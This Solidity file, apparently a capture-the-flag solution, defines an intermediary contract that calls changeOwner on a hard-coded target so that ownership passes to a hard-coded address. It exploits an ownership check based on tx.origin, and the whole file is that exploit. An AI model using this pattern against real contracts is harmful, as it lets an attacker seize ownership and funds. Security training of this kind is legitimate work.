// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

interface ITelephone {
  function changeOwner(address) external;
}

contract TelephoneCaller {
  address telephoneAddress = 0x9D19dAE59828c3B702ba346E20c94264Dbd5e1Fb;
  address newOwner = 0x28240809fcf756F1398c415E14f616f2Ae32eF1D;
  function changeOwner() public {
    ITelephone(telephoneAddress).changeOwner(newOwner);
  }
}